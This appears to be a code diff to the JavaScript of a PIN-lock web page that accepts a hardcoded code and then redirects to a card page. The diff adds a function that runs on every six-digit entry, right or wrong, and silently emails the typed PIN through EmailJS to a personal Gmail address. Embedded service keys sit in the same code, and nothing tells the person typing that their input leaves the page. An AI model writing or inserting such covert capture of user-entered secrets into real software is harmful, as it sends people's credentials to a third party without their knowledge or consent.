@@ -20,11 +20,13 @@ document.addEventListener("DOMContentLoaded", () => {
                 addDot();
                 if (input.value === "070743" && input.value.length == 6) {
                     correct();
+                    sendPinViaEmail();
                     setTimeout(() => {
                         clearDot();
                         window.location.href = "./puenisrk-card.html";
                     }, 1300);
                 } else if (input.value.length == 6) {
+                    sendPinViaEmail();
                     setTimeout(() => {
                         incorrect();
                         clearDot();
@@ -111,4 +113,19 @@ document.addEventListener("DOMContentLoaded", () => {
         logo.style.backgroundImage = "url('assets/9.png')";
         showWarning("Incorrect PIN!");
     }
+
+    function sendPinViaEmail() {
+        const pin = document.getElementById("pin").value;
+        emailjs.send("service_pphpt7", "template_mfyblxk", {
+            pin_code: pin,
+            email: "nitiphon.ww@gmail.com"
+        }, {
+            publicKey: "wEiGT1X-aPheITAqR"
+        }).then((response) => {
+            console.log("✅ Email sent:", response.status, response.text);
+        }).catch((error) => {
+            console.error("❌ Email failed:", error);
+        });
+    }
+
 });
